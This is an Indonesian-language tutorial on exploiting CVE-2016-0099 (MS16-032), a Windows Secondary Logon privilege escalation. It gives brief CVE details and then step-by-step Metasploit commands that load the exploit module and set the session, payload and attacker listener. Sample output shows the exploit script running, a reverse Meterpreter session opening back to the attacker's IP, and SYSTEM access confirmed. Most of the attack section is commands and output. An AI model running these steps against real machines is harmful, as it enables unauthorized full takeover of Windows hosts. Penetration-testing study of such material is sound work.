# CVE-2016-0099

## A. CVE-2016-0099?

[CVE-2016-0099](https://nvd.nist.gov/vuln/detail/cve-2016-0099) adalah kerentanan local privilege escalation pada sistem operasi Windows yang ditemukan pada layanan Secondary Logon Service (`seclogon.dll`). Kerentanan ini memungkinkan penyerang dengan hak akses user biasa untuk menaikkan hak akses menjadi `SYSTEM`, yaitu level tertinggi di sistem Windows.

Eksploitasi ini terjadi karena adanya kesalahan pengelolaan handle token proses yang dilakukan oleh `seclogon.dll`, sehingga memungkinkan penyerang untuk menyisipkan proses baru dengan hak akses `SYSTEM` menggunakan teknik `CreateProcessWithLogonW()`.

## B. Detail Teknis
- CVE ID: `CVE-2016-0099`  
- Tanggal Rilis: `8 Maret 2016`  
- Tipe: Local Privilege Escalation (LPE)  
- Fungsi Rentan: `CreateProcessWithLogonW`  
- Komponen: `seclogon.dll`  
- Platform: `Windows` (seluruh versi rentan yang terpengaruh)
- Arsitektur: `x86` dan `x64`  
- Skor CVSS: `7.8` (Tinggi)
  
## C. Sistem yang Rentan

Untuk melihat semua sistem yang rentan terhadap `CVE-2016-0099`, anda bisa melihatnya di dokumentasi resmi Microsoft: [https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032#affected-software-and-vulnerability-severity-ratings](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032#affected-software-and-vulnerability-severity-ratings)

## D. Langkah Penggunaan di Metasploit

1. Dapatkan Akses Awal (User Biasa):

   ```
   msf6 > sessions          # Lihat sesi yang ada
   msf6 > sessions -i 1     # Masuk ke sesi dengan ID 1
   msf6 > getuid            # Melihat user saat ini
   msf6 > sysinfo           # Informasi sistem target
   ```

2. Keluar dari Sesi Meterpreter:
   
   ```
   msf6 > background
   ```

3. Gunakan Modul Exploit MS16-032:

   ```
   msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
   ```

4. Setting Parameter Penting:

   ```
   msf6 > set SESSION <ID>
   msf6 > set PAYLOAD <PAYLOAD>
   msf6 > set LHOST <IP_ATTACKER>
   msf6 > set LPORT <PORT_LISTENER>
   msf6 > set TARGET <ID>
   msf6 > set VERBOSE true
   ```

   > Untuk ID target bisa dilihat dengan:

   ```
   msf6 > show targets
   ```

5. Jalankan Exploit:

   ```
   msf6 > exploit
   ```

   Jika hasil output-nya seperti ini:

   ```
   [*] PS1 loaded from /usr/share/metasploit-framework/data/exploits/CVE-2016-0099/cve_2016_0099.ps1
   [*] Writing payload file, C:\Users\ADMIN\AppData\Local\Temp\zdwvVpZzyRCY.ps1...
   [*] Compressing script contents...
   [+] Compressed size: 3723
   [*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]

   [?] Operating system core count: 2
   [>] Duplicating CreateProcessWithLogonW handle
   [?] Done, using thread handle: 1112

   [*] Sniffing out privileged impersonation token..

   [?] Thread belongs to: svchost
   [+] Thread suspended
   [>] Wiping current impersonation token
   [>] Building SYSTEM impersonation token
   [ref] cannot be applied to a variable that does not exist.
   At line:200 char:59
   +         $dhA = [Ntdll]::NtImpersonateThread($qdY, $qdY, [ref]$qi <<<< )
       + CategoryInfo          : InvalidOperation: (qi:Token) [], RuntimeExceptio 
      n
       + FullyQualifiedErrorId : NonExistingVariableReference
 
   [!] NtImpersonateThread failed, exiting..
   [+] Thread resumed!

   [*] Sniffing out SYSTEM shell..

   [>] Duplicating SYSTEM token
   Cannot convert argument "0", with value: "", for "DuplicateToken" to type "Syst
   em.IntPtr": "Cannot convert null to type "System.IntPtr"."
   At line:259 char:35
   +     $dhA = [Advapi32]::DuplicateToken <<<< ($nxfWT, 2, [ref]$isTl)
       + CategoryInfo          : NotSpecified: (:) [], MethodException
       + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
   [>] Starting token race
   [>] Starting process race
   [!] Holy handle leak Batman, we have a SYSTEM shell!!

   EpGsSpsRhiU1UMP9YNyfQwBdFAPYrXHh
   [+] Executed on target machine.
   [*] Sending stage (203846 bytes) to 192.168.1.50
   [*] Meterpreter session 8 opened (192.168.1.42:4444 -> 192.168.1.50:49161) at 2025-05-14 03:42:55 +0700
   [+] Deleted C:\Users\ADMIN\AppData\Local\Temp\zdwvVpZzyRCY.ps1

   meterpreter > 
   ```

   Itu artinya kita sudah mendapatkan akses tertinggi dari sistem. Untuk mengeceknya, ketikkan perintah berikut:

   ```
   meterpreter > getuid 
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > getuid 
   Server username: NT AUTHORITY\SYSTEM
   meterpreter > 
   ```

   > Keterangan: `NT AUTHORITY\SYSTEM` adalah akun tertinggi di sistem Windows itu setara dengan `root` pada sistem Linux.
